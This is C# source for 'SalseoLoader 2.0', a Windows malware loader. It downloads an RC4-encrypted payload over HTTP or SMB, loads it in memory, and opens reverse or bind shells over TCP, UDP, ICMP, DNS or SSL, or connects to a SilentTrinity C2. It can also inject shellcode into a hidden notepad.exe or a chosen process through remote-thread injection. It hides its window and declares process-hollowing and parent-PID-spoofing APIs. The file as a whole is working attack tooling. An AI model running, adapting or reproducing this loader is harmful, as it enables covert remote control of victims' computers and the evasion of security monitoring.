/*
 * Created by SharpDevelop.
 * User: CyberVaca 
 * Twitter: https://twitter.com/CyberVaca_
 * Date: 10/11/2018
 * Time: 0:05
 * 
 * To change this template use Tools | Options | Coding | Edit Standard Headers.
 */
using System;
using System.Collections;
using System.IO;
using System.Net;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.IO.Compression;
using System.Reflection;
using System.Diagnostics;
using System.Security.Principal;

namespace SalseoDecrypter
{
    class SalsaInjector
    {
        [DllImport("Kernel32", SetLastError = true)]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

        [DllImport("Kernel32", SetLastError = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("Kernel32", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [MarshalAs(UnmanagedType.AsAny)] object lpBuffer, uint nSize, ref uint lpNumberOfBytesWritten);

        [DllImport("Kernel32", SetLastError = true)]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, ref uint lpThreadId);

        [DllImport("Kernel32", SetLastError = true)]
        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("Kernel32", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        #region DLL Injection
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetModuleHandleA(string lpModuleName);

        [DllImport("kernel32", SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        #endregion DLL Injection

        #region Process Hollowing
        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwCreateSection(ref IntPtr section, uint desiredAccess, IntPtr pAttrs, ref LARGE_INTEGER pMaxSize, uint pageProt, uint allocationAttribs, IntPtr hFile);

        [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern void GetSystemInfo(ref SYSTEM_INFO lpSysInfo);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwMapViewOfSection(IntPtr section, IntPtr process, ref IntPtr baseAddr, IntPtr zeroBits, IntPtr commitSize, IntPtr stuff, ref IntPtr viewSize, int inheritDispo, uint alloctype, uint prot);

        [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern IntPtr GetCurrentProcess();

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        public static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.StdCall)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, IntPtr nSize, out IntPtr lpNumWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwUnmapViewOfSection(IntPtr hSection, IntPtr address);

        [DllImport("Kernel32.dll", SetLastError = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        private static extern bool CreateProcess(IntPtr lpApplicationName, string lpCommandLine, IntPtr lpProcAttribs, IntPtr lpThreadAttribs, bool bInheritHandles, uint dwCreateFlags, IntPtr lpEnvironment, IntPtr lpCurrentDir, [In] ref STARTUPINFO lpStartinfo, out PROCESS_INFORMATION lpProcInformation);

        [DllImport("kernel32.dll")]
        static extern uint GetLastError();
        #endregion Process Hollowing

        #region Parent PID Spoofing
        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool SetHandleInformation(IntPtr hObject, HANDLE_FLAGS dwMask, HANDLE_FLAGS dwFlags);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool DuplicateHandle(IntPtr hSourceProcessHandle, IntPtr hSourceHandle, IntPtr hTargetProcessHandle, ref IntPtr lpTargetHandle, uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions);
        #endregion Parent PID Spoofing

        //http://www.pinvoke.net/default.aspx/kernel32/OpenProcess.html
        public enum ProcessAccessRights
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }

        //https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
        public enum MemAllocation
        {
            MEM_COMMIT = 0x00001000,
            MEM_RESERVE = 0x00002000,
            MEM_RESET = 0x00080000,
            MEM_RESET_UNDO = 0x1000000,
            SecCommit = 0x08000000
        }

        //https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants
        public enum MemProtect
        {
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
            PAGE_EXECUTE_WRITECOPY = 0x80,
            PAGE_NOACCESS = 0x01,
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_WRITECOPY = 0x08,
            PAGE_TARGETS_INVALID = 0x40000000,
            PAGE_TARGETS_NO_UPDATE = 0x40000000,
        }

        // https://docs.microsoft.com/en-us/windows/win32/procthread/thread-security-and-access-rights
        public enum MemOpenThreadAccess
        {

            PROCESS_CREATE_THREAD = 0x0002,
            PROCESS_QUERY_INFORMATION = 0x0400,
            PROCESS_VM_OPERATION = 0x0008,
            PROCESS_VM_WRITE = 0x0020,
            PROCESS_VM_READ = 0x0010,
            SUSPEND_RESUME = 0x0002,
        }

        #region Parent PID Spoofing Structs and flags
        // Parent PID Spoofing flags - https://www.pinvoke.net/default.aspx/kernel32.sethandleinformation
        enum HANDLE_FLAGS : uint
        {
            None = 0,
            INHERIT = 1,
            PROTECT_FROM_CLOSE = 2
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            [MarshalAs(UnmanagedType.Bool)]
            public bool bInheritHandle;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        }
        #endregion Parent PID Spoofing structs and flags

        #region Process Hollowing Structs
        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [StructLayout(LayoutKind.Sequential)]
        //internal struct STARTUPINFO
        public struct STARTUPINFO
        {
            uint cb;
            IntPtr lpReserved;
            IntPtr lpDesktop;
            IntPtr lpTitle;
            uint dwX;
            uint dwY;
            uint dwXSize;
            uint dwYSize;
            uint dwXCountChars;
            uint dwYCountChars;
            uint dwFillAttributes;
            public uint dwFlags;
            public ushort wShowWindow;
            ushort cbReserved;
            IntPtr lpReserved2;
            IntPtr hStdInput;
            IntPtr hStdOutput;
            IntPtr hStdErr;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SYSTEM_INFO
        {
            public uint dwOem;
            public uint dwPageSize;
            public IntPtr lpMinAppAddress;
            public IntPtr lpMaxAppAddress;
            public IntPtr dwActiveProcMask;
            public uint dwNumProcs;
            public uint dwProcType;
            public uint dwAllocGranularity;
            public ushort wProcLevel;
            public ushort wProcRevision;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct LARGE_INTEGER
        {
            public uint LowPart;
            public int HighPart;
        }
        #endregion End of Process Hollowing Structs

        public static byte[] StringToByteArray(string hex)
        {
            return Enumerable.Range(0, hex.Length)
                             .Where(x => x % 2 == 0)
                             .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
                             .ToArray();
        }
        public static byte[] convertfromc(string val)
        {
            string rval = val.Replace("\"", string.Empty).Replace("\r\n", string.Empty).Replace("x", string.Empty);
            string[] sval = rval.Split('\\');

            var fval = string.Empty;
            foreach (var lval in sval)
            {
                if (lval != null)
                {
                    fval += lval;
                }
            }

            return StringToByteArray(fval);
        }
        public static void CodeInject(int pid, byte[] buf)
        {
            try
            {
                uint lpNumberOfBytesWritten = 0;
                uint lpThreadId = 0;
                Console.WriteLine("[+] Obteniendo handler del proceso con pid " + pid);
                IntPtr pHandle = OpenProcess((uint)ProcessAccessRights.All, false, (uint)pid);
                Console.WriteLine("[+] Asignacion de memoria para inyectar el shellcode.");
                IntPtr rMemAddress = VirtualAllocEx(pHandle, IntPtr.Zero, (uint)buf.Length, (uint)MemAllocation.MEM_RESERVE | (uint)MemAllocation.MEM_COMMIT, (uint)MemProtect.PAGE_EXECUTE_READWRITE);
                Console.WriteLine("[+] Memoria para inyectar shellcode asignada en 0x" + rMemAddress);
                Console.WriteLine("[+] Escribiendo el shellcode en la memoria asignada.");
                if (WriteProcessMemory(pHandle, rMemAddress, buf, (uint)buf.Length, ref lpNumberOfBytesWritten))
                {
                    Console.WriteLine("[+] Shellcode escrito en la memoria de proceso.");
                    Console.WriteLine("[+] Creando hilos remotos para la ejecucion del shellcode.");
                    IntPtr hRemoteThread = CreateRemoteThread(pHandle, IntPtr.Zero, 0, rMemAddress, IntPtr.Zero, 0, ref lpThreadId);
                    bool hCreateRemoteThreadClose = CloseHandle(hRemoteThread);
                    Console.WriteLine("[+] Inyectado con exito el shellcode en el pid " + pid + " :)");
                }
                else
                {
                    Console.WriteLine("[+] Error al inyectar el shellcode en la memoria del proceso con pid " + pid);
                }
                bool hOpenProcessClose = CloseHandle(pHandle);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[+] " + Marshal.GetExceptionCode());
                Console.WriteLine(ex.Message);
            }
        }


    }
    class Program
    {
        [Flags]
        public enum AllocationType : uint
        {
            COMMIT = 0x1000,
            RESERVE = 0x2000,
            RESET = 0x80000,
            LARGE_PAGES = 0x20000000,
            PHYSICAL = 0x400000,
            TOP_DOWN = 0x100000,
            WRITE_WATCH = 0x200000
        }

        [Flags]
        public enum MemoryProtection : uint
        {
            EXECUTE = 0x10,
            EXECUTE_READ = 0x20,
            EXECUTE_READWRITE = 0x40,
            EXECUTE_WRITECOPY = 0x80,
            NOACCESS = 0x01,
            READONLY = 0x02,
            READWRITE = 0x04,
            WRITECOPY = 0x08,
            GUARD_Modifierflag = 0x100,
            NOCACHE_Modifierflag = 0x200,
            WRITECOMBINE_Modifierflag = 0x400
        }

        public enum FreeType : uint
        {
            MEM_DECOMMIT = 0x4000,
            MEM_RELEASE = 0x8000
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32")]
        private static extern bool VirtualFree(IntPtr lpAddress, UInt32 dwSize, FreeType dwFreeType);

        [UnmanagedFunctionPointerAttribute(CallingConvention.Cdecl)]
        public delegate Int32 ExecuteDelegate();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        static void main()
        {
            //#############################################################
            //########### Leyendo Variables de Entorno dll ################
            //#############################################################
            string varpass = null;
            string varpayload = null;
            string varshell = null;
            string varlhost = null;
            string varlport = null;
            string vardnsserver = null;
            string url_c2c = null;
            if ((Environment.GetEnvironmentVariable("PASS")) != null) { varpass = Environment.GetEnvironmentVariable("PASS"); } else { };
            if ((Environment.GetEnvironmentVariable("PAYLOAD")) != null) { varpayload = Environment.GetEnvironmentVariable("PAYLOAD"); } else { };
            if ((Environment.GetEnvironmentVariable("SHELL")) != null) { varshell = Environment.GetEnvironmentVariable("SHELL"); } else { };
            if ((Environment.GetEnvironmentVariable("LHOST")) != null) { varlhost = Environment.GetEnvironmentVariable("LHOST"); } else { };
            if ((Environment.GetEnvironmentVariable("LPORT")) != null) { varlport = Environment.GetEnvironmentVariable("LPORT"); } else { };
            if ((Environment.GetEnvironmentVariable("DNSSERVER")) != null) { vardnsserver = Environment.GetEnvironmentVariable("DNSSERVER"); } else { };
            if ((Environment.GetEnvironmentVariable("URL_C2C")) != null) { url_c2c = Environment.GetEnvironmentVariable("URL_C2C"); } else { };
            if (varpass != null & varpayload != null & url_c2c != null & varshell.ToLower() == "silenttrinity") { string[] argumentos = { varpass, varpayload, varshell, url_c2c }; Main(argumentos); };
            if (varpass != null & varpayload != null & varshell.ToLower() == "shellcode") { string[] argumentos = { varpass, varpayload, varshell }; Main(argumentos); };
            if (varpass != null & varpayload != null & varshell != null & varlhost != null & vardnsserver == null) { string[] argumentos = { varpass, varpayload, varshell, varlhost, varlport }; Main(argumentos); };
            if (varpass != null & varpayload != null & varshell != null & varlhost != null & vardnsserver != null) { string[] argumentos = { varpass, varpayload, varshell, varlhost, vardnsserver }; Main(argumentos); };

        }
        static void Main(string[] args)
        {
            IntPtr h = Process.GetCurrentProcess().MainWindowHandle;
            ShowWindow(h, 0);
            string banner = @"
  _____  ____  _     _____   ___   ___    
 / ___/ /    || |   / ___/  /  _] /   \   
(   \_ |  o  || |  (   \_  /  [_ |     |  
 \__  ||     || |___\__  ||    _]|  O  |  
 /  \ ||  _  ||     /  \ ||   [_ |     |  
 \    ||  |  ||     \    ||     ||     |  
  \___||__|__||_____|\___||_____| \___/   
                                          
 _       ___    ____  ___      ___  ____  
| |     /   \  /    ||   \    /  _]|    \ 
| |    |     ||  o  ||    \  /  [_ |  D  )
| |___ |  O  ||     ||  D  ||    _]|    / 
|     ||     ||  _  ||     ||   [_ |    \ 
|     ||     ||  |  ||     ||     ||  .  \
|_____| \___/ |__|__||_____||_____||__|\_|    2.0

";
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Write(banner);
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("                             By: CyberVaca@HackPlayers");

            if (args.Length <= 2)
            {
                string ayuda = @"
[+] Usage:

    [-] SalseoLoader.exe password http://webserver.com/elfuckingmal.txt ReverseTCP LHOST LPORT
    [-] SalseoLoader.exe password \\smbserver.com\evil\elfuckingmal.txt ReverseUDP LHOST LPORT
    [-] SalseoLoader.exe password c:\temp\elfuckingmal.txt ReverseICMP LHOST
    [-] SalseoLoader.exe password http://webserver.com/elfuckingmal.txt ReverseDNS LHOST ServerDNS
    [-] SalseoLoader.exe password http://webserver.com/elfuckingmal.txt BindTCP LHOST LPORT
    [-] SalseoLoader.exe password c:\temp\elfuckingmal.txt ReverseSSL LHOST LPORT
    [-] SalseoLoader.exe password http://webserver.com/shellcode.txt shellcode
    [-] SalseoLoader.exe password http://webserver.com/shellcode.txt shellcode PID
    [-] SalseoLoader.exe password http://webserver.com/silent.txt silenttrinity URL_C2C
    
[+] Available Payloads:

    [-] ReverseTCP  [-] ReverseDNS   [-] ReverseSSL  [-] Shellcode
    [-] ReverseUDP  [-] ReverseICMP  [-] BindTCP     [-] SilentTrinity

";
                // Ayuda();
                Console.ForegroundColor = ConsoleColor.Gray;
                Console.WriteLine(ayuda);
                System.Environment.Exit(1);

            }



            //################### Parametros del Loader y comprobacion de los argumentos introducidos ################### 
            string Salseo_Encriptado = null;
            string clave = args[0].ToString();
            byte[] xKey = Encoding.ASCII.GetBytes(clave);
            string Salseo_URL = args[1].ToString();
            string funcion = args[2].ToString().ToLower();
            if (funcion == "reversetcp" || funcion == "reversessl") { if (args.Length < 5) { Console.WriteLine("\n[-] Necesitas introducir un puerto :("); Environment.Exit(1); } }
            if (funcion == "reverseudp") { if (args.Length < 5) { Console.WriteLine("\n[-] Necesitas introducir un puerto :("); Environment.Exit(1); } }
            if (funcion == "reversedns") { if (args.Length < 5) { Console.WriteLine("\n[-] Necesitas introducir un nombre de dominio :("); Environment.Exit(1); } }
            if (funcion == "reverseicmp") { if (args.Length < 4) { Environment.Exit(1); } }
            if (funcion == "shellcode") { if (args.Length < 2) { Environment.Exit(1); } }
            if (funcion != "reversetcp" & funcion != "reversedns" & funcion != "reverseicmp" & funcion != "reverseudp" & funcion != "bindtcp" & funcion != "reversessl" & funcion != "shellcode" & funcion != "silenttrinity") { Console.WriteLine("\n[-] Error en el tipo de shell :("); Environment.Exit(1); }
            if (funcion == "silenttrinity") { if (args.Length < 3) { Environment.Exit(1); } }
            Console.ForegroundColor = ConsoleColor.Gray;
            if (args[1].ToString().Substring(0, 4).ToLower() == "http") { Salseo_Encriptado = ClienteWeb.LeePayload(args[1].ToString()); }
            if (args[1].ToString().Substring(0, 2).ToLower() == "\\\\") { Console.WriteLine("[+] Leyendo datos via SMB..."); if (System.IO.File.Exists(Salseo_URL) == false) { Console.WriteLine("[-] Error: No se pudo leer el payload ¿ La ruta es correcta ?"); Environment.Exit(1); } Salseo_Encriptado = LeeArchivoSMBorLocal.Archivo(args[1].ToString()); }
            if (args[1].ToString().Substring(0, 4).ToLower() != "http" && args[1].ToString().Substring(0, 2).ToLower() != "\\\\") { Console.WriteLine("[+] Leyendo datos via LOCAL..."); if (System.IO.File.Exists(Salseo_URL) == false) { Console.WriteLine("[-] Error: No se pudo leer el payload ¿ La ruta es correcta ?"); Environment.Exit(1); } Salseo_Encriptado = LeeArchivoSMBorLocal.Archivo(args[1].ToString()); }
            //#############################################################
            //####################### Cargando dll ######################## 
            //#############################################################

            string hexadecimal = Zipea.Descomprime(Salseo_Encriptado);
            byte[] Final_Payload_encriptado = StringHEXToByteArray.Convierte(hexadecimal);
            byte[] Final_Payload = RC4.Decrypt(xKey, Final_Payload_encriptado);
            string clases = null;
            Assembly salsongo = null;

            if (funcion != "shellcode")
            {
                salsongo = Assembly.Load(Final_Payload);
                Console.WriteLine("[+] Cargando la salsa en memoria.");
                Console.WriteLine("[+] Namespace de Assembly : " + salsongo.GetName().Name);
                foreach (Type infoass in salsongo.GetTypes()) { var strclase = string.Format("{0}", infoass.Name); clases = strclase; };
                //######################## Foreach de los metodos ####################
                //#####################################################################
                //Console.WriteLine("[+] Version: " + salsongo.GetName().Version.ToString());
                //Console.ForegroundColor = ConsoleColor.White;
                //#############################################################

            }

            //########################### LLamada a funcion SilentTrinity ########################
            if (funcion == "silenttrinity")
            {
                string URLSILENT = args[3].ToString();
                string[] argumentos = new string[] { URLSILENT };
                Type myType = salsongo.GetTypes()[0];
                MethodInfo Method = myType.GetMethod("lanza");
                object myInstance = Activator.CreateInstance(myType);
                Method.Invoke(myInstance, new object[] { argumentos });
            }
            //########################### LLamada a funcion Reversa ########################
            if (funcion == "reversetcp")
            {
                string LHOST = args[3].ToString();
                string LPORT = args[4].ToString();
                string[] argumentos = new string[] { LHOST + " " + LPORT };
                Type myType = salsongo.GetTypes()[0];
                MethodInfo Method = myType.GetMethod("reversetcp");
                object myInstance = Activator.CreateInstance(myType);
                Method.Invoke(myInstance, new object[] { argumentos });
            }
            if (funcion == "reversessl")
            {
                string LHOST = args[3].ToString();
                string LPORT = args[4].ToString();
                string[] argumentos = new string[] { LHOST + " " + LPORT };
                Type myType = salsongo.GetTypes()[0];
                MethodInfo Method = myType.GetMethod("reversessl");
                object myInstance = Activator.CreateInstance(myType);
                Method.Invoke(myInstance, new object[] { argumentos });
            }
            if (funcion == "reverseudp")
            {
                string LHOST = args[3].ToString();
                string LPORT = args[4].ToString();
                string[] argumentos = new string[] { LHOST + " " + LPORT };
                Type myType = salsongo.GetTypes()[0];
                MethodInfo Method = myType.GetMethod("reverseudp");
                object myInstance = Activator.CreateInstance(myType);
                Method.Invoke(myInstance, new object[] { argumentos });
            }
            if (funcion == "reversedns")
            {
                string LHOST = args[3].ToString();
                string DNSServer = args[4].ToString();
                string[] argumentos = new string[] { LHOST + " " + DNSServer };
                Type myType = salsongo.GetTypes()[0];
                MethodInfo Method = myType.GetMethod("reversedns");
                object myInstance = Activator.CreateInstance(myType);
                Method.Invoke(myInstance, new object[] { argumentos });
            }
            if (funcion == "reverseicmp")
            {
                string LHOST = args[3].ToString();
                string[] argumentos = new string[] { LHOST + " " };
                Type myType = salsongo.GetTypes()[0];
                MethodInfo Method = myType.GetMethod("reverseicmp");
                object myInstance = Activator.CreateInstance(myType);
                Method.Invoke(myInstance, new object[] { argumentos });
            }
            if (funcion == "bindtcp")
            {
                string LHOST = args[3].ToString();
                string LPORT = args[4].ToString();
                string[] argumentos = new string[] { LHOST + " " + LPORT };
                Type myType = salsongo.GetTypes()[0];
                MethodInfo Method = myType.GetMethod("bindtcp");
                object myInstance = Activator.CreateInstance(myType);
                Method.Invoke(myInstance, new object[] { argumentos });
            }
            if (funcion == "shellcode")
            {
               
                byte[] sc = Final_Payload;
                if (args.Length == 4)
                {
                    int pid = System.Convert.ToInt32(args[3].ToString());
                    SalsaInjector.CodeInject(pid, sc);
                }
                if (args.Length == 3)
                {
                    Process proc = new Process();
                    Console.WriteLine("[+] Spawneando proceso notepad.exe");
                    proc.StartInfo.FileName = "C:\\WINDOWS\\SYSTEM32\\NOTEPAD.EXE";
                    proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    proc.Start();
                    int pid = proc.Id;
                    Console.WriteLine("[+] Proceso con pid " + pid);
                    SalsaInjector.CodeInject(pid, sc);
                }

            }
        }

        public class BiteArrayToHex
        {
            public static string Convierte(byte[] bytearray_a_convertir)
            {
                return (BitConverter.ToString(bytearray_a_convertir)).Replace("-", "").ToLower();
            }

        }

        public class BiteArrayFromArchivo
        {

            public static byte[] ExtraeBites(string Archivo_a_leer)
            {
                byte[] Bites_extraidos = System.IO.File.ReadAllBytes(Archivo_a_leer);
                return Bites_extraidos;
            }


        }

        public class StringHEXToByteArray
        {
            public static byte[] Convierte(String hex)
            {
                int NumberChars = hex.Length;
                byte[] bytes = new byte[NumberChars / 2];

                for (int i = 0; i < NumberChars; i += 2)
                {
                    bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
                }

                return bytes;
            }
        }

        public class BitArrayToString
        {

            public static string Convierte(byte[] movidaaconvertir)
            {
                string a = "";
                foreach (Byte b in movidaaconvertir)
                {
                    a += (b + " ");
                }
                return a;
            }

        }

        public class RC4
        {

            public static byte[] Encrypt(byte[] pwd, byte[] data)
            {
                int a, i, j, k, tmp;
                int[] key, box;
                byte[] cipher;

                key = new int[256];
                box = new int[256];
                cipher = new byte[data.Length];

                for (i = 0; i < 256; i++)
                {
                    key[i] = pwd[i % pwd.Length];
                    box[i] = i;
                }
                for (j = i = 0; i < 256; i++)
                {
                    j = (j + box[i] + key[i]) % 256;
                    tmp = box[i];
                    box[i] = box[j];
                    box[j] = tmp;
                }
                for (a = j = i = 0; i < data.Length; i++)
                {
                    a++;
                    a %= 256;
                    j += box[a];
                    j %= 256;
                    tmp = box[a];
                    box[a] = box[j];
                    box[j] = tmp;
                    k = box[((box[a] + box[j]) % 256)];
                    cipher[i] = (byte)(data[i] ^ k);
                }
                return cipher;
            }

            public static byte[] Decrypt(byte[] pwd, byte[] data)
            {
                return Encrypt(pwd, data);
            }

            public static byte[] StringToByteArray(String hex)
            {
                int NumberChars = hex.Length;
                byte[] bytes = new byte[NumberChars / 2];
                for (int i = 0; i < NumberChars; i += 2)
                    bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
                return bytes;
            }

        }

        public class ClienteWeb
        {

            public static string LeePayload(string URL)
            {
                try
                {
                    Console.ForegroundColor = ConsoleColor.Gray;
                    Console.WriteLine("[+] Leyendo datos via HTTP...");
                    WebClient client = new WebClient();
                    client.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
                    Stream data = client.OpenRead(URL);
                    StreamReader reader = new StreamReader(data);
                    string Salseo_Encriptado = reader.ReadToEnd();
                    data.Close();
                    reader.Close();
                    return Salseo_Encriptado;
                }
                catch
                {

                    Console.WriteLine("[-] Error: No se pudo conectar con la URL proporcionada :(");
                    Environment.Exit(1);
                    return "[-] Error: No se pudo conectar con la URL proporcionada :(";

                }

            }
        }

        public class LeeArchivoSMBorLocal
        {

            public static string Archivo(string ruta)
            {
                return File.ReadAllText(ruta, Encoding.UTF8);

            }
        }

        public class Zipea
        {
            private static void CopyTo(Stream src, Stream dest)
            {
                byte[] bytes = new byte[4096];

                int cnt;

                while ((cnt = src.Read(bytes, 0, bytes.Length)) != 0)
                {
                    dest.Write(bytes, 0, cnt);
                }
            }

            public static string Comprime(string movidaacomprimir)
            {

                byte[] inputBytes = Encoding.UTF8.GetBytes(movidaacomprimir);

                using (var outputStream = new MemoryStream())
                {
                    using (var gZipStream = new GZipStream(outputStream, CompressionMode.Compress))
                        gZipStream.Write(inputBytes, 0, inputBytes.Length);
                    var outputBytes = outputStream.ToArray();
                    var outputbase64 = Convert.ToBase64String(outputBytes);
                    return outputbase64;

                }
            }
            public static string Descomprime(string movidaadescomprimir)
            {
                byte[] gZipBuffer = Convert.FromBase64String(movidaadescomprimir);
                using (var msi = new MemoryStream(gZipBuffer))
                using (var mso = new MemoryStream())
                {
                    using (var gs = new GZipStream(msi, CompressionMode.Decompress))
                    {

                        CopyTo(gs, mso);
                    }

                    return Encoding.UTF8.GetString(mso.ToArray());
                }


            }
        }
    }
}






